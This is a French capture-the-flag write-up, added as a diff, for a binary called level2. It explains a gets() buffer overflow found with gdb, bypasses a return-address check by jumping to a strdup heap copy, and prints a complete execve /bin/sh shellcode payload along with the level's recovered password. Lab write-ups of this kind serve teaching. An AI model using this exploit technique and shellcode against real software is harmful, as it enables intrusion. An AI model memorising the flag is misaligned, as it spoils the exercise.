@@ -1,0 +1,31 @@
+Si on lance l'executable avec ou sans argument on voit qu'on peut écrire sur le stdin et 
+lorsqu'on lui envoi quelque chose, le programme nous renvoie la meme chose et se termine.
+
+On lance gdb, en faisant un disas main on voit qu'il y a une fonction 'p' qui est utilisée.
+On fait un disas p, on voit qu'il y a encore un appel à gets donc le programme est vulnérable 
+au buffer overflow.
+Cependant une comparaison avec un masque binaire sur 0xb0000000 nous empêche d’écraser EIP 
+avec une adresse commençant par 0xb, on ne peut donc pas utiliser un call system.
+On va donc essayer d’injecter un shellcode via le call de strdup qui enverrait notre shellcode 
+sur la heap.
+
+Avec gdb on peut récupérer l’adresse de depart de la copie du strdup : 0x804a008
+
+On récupère notre shellcode ici :
+https://dhavalkapil.com/blogs/Shellcode-Injection/
+
+On a maintenant besoin de trouver l’offset d’EIP, pour cela on utilise ce site : 
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+Le registre EIP se trouve donc à 80 bytes.
+
+Notre shellcode fait 25 bytes. 80 - 25 = 55, il faudra donc remplir les 55 autres octets par 
+des instructions nop ( \x90 ) puis rajouter l’adresse du strdup.
+
+Voilà à quoi ressemblerait le payload : 
+
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" 
++ "\x90" * 55 + "\x08\xa0\x04\x08"' > /tmp/payload && cat /tmp/payload - | ./level2
+
+En l’executant il y a bien un shell qui pop, en faisant whoami on voit qu’on est bien level3, 
+on peut donc récupérer le pass :
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
